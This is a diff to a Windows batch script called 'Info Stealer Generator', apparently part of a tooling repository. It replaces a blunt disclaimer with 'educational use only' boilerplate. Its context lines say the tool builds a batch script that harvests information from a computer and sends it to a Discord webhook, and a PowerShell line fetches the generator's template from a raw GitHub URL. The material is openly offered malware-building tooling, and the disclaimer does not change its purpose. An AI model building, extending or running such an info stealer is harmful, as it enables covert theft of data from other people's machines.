@@ -9,7 +9,9 @@ cls
 if exist logo.bat call logo.bat & echo.
 echo Info Stealer Generator
 echo =======================
-echo I AM NOT RESPONSIBLE FOR ANYTHING CAUSED BY THIS SCRIPT.
+echo THIS TOOL IS INTENDED FOR EDUCATIONAL USE ONLY.
+echo USER ASSUMES FULL LEGAL RESPONSIBILITY FOR ALL ACTIONS PERFORMED.
+echo MISUSE MAY VIOLATE COMPUTER CRIME LAWS IN YOUR JURISDICTION.
 echo This will generate a batch script that will collect info from a computer and send it to a discord webhook.
 echo.
 if not exist isgen.txt echo Downloading isgen.txt.. & echo. & powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm https://raw.githubusercontent.com/SchooiCodes/smt/refs/heads/main/Files/isgen.txt -OutFile isgen.txt"
